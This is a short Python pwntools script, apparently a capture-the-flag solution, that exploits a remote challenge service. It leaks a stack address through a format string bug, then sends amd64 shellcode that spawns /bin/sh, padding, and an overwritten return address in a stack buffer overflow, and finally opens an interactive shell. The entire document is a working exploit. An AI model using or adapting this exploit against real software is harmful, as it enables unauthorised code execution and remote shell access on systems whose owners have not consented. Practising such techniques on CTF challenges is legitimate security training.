from pwn import *

# Connect to the instance
conn = remote('chal.fallctf.com', 5006)
# Use process() for local challenge files.
# conn = process('./challenge')

# leak stack address with format string vulnerability
conn.recvuntil(b'> ')
conn.sendline(b'%14$p')
stack_leak = int(conn.recvline().decode().strip().split(' ')[-1], 16)
log.info(f'stack leak: {hex(stack_leak)}')

# calculate info address
info_addr = stack_leak - 0x30
log.info(f'info address: {hex(info_addr)}')

conn.recvuntil(b'> ')

# Send the payload
shellcode = asm("""
	xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
""", arch='amd64', os='linux')

# jump to our shellcode which is at name_addr
conn.sendline(shellcode + b'A'*(40-len(shellcode)) + p64(info_addr))

conn.interactive()
